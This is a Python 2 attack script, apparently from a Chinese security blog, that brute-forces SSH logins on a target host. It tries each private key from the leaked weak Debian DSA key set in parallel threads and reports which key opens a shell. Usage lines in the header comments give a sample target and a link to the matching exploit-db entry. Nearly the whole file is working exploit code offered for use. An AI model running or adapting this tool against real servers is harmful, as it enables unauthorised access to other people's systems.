#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/12
# Created by 冰河
# Description 利用ssh密钥暴力破解SSH，
#             命令格式为： ssh user@host -i keyfile -o PasswordAuthentication=no,建议在Linux下运行
#             用法： python ssh_dsa_attack.py -H 192.168.175.131 -u root -d dsa/1024
#             将debian_ssh_dsa_1024_x86.tar.bz2解压后，将dsa/1024/目录下的pub后缀的公钥文件删除
#             网上存在此种漏洞攻击方式，地址为：https://www.exploit-db.com/exploits/5720
# 博客 https://blog.csdn.net/l1028386804

import pexpect
import optparse
import os
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

#连接目标主机
def connect(user, host, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])
        if ret == 2:
            print '[-] Adding Host to !/.ssh/known_hosts'
            child.sendline('yes')
            connect(user, host, keyfile, False)

        elif ret == 3:
            print '[-] Connection Closed By Remote Host'
            Fails += 1

        elif ret > 3:
            print '[+] Success. ' + str(keyfile)
            Stop = True

    finally:
        if release:
            connection_lock.release()

#主函数，解析参数
def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    if host == None or passDir == None or user == None:
        print parser.usage
        exit(0)

    for filename in os.listdir(passDir):
        if Stop:
            print '[*] Exiting: Key Found.'
            exit(0)

        if Fails > 5:
            print '[!] Exiting: Too Many Connections CLosed By Remote Host.'
            print '[!] Adjust number of simultaneous threads.'
            exit(0)

        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print '[-] Testing keyfile ' + str(fullpath)

        t = Thread(target=connect, args=(user, host, fullpath, True))
        t.start()

#程序入口
if __name__ == '__main__':
    main()





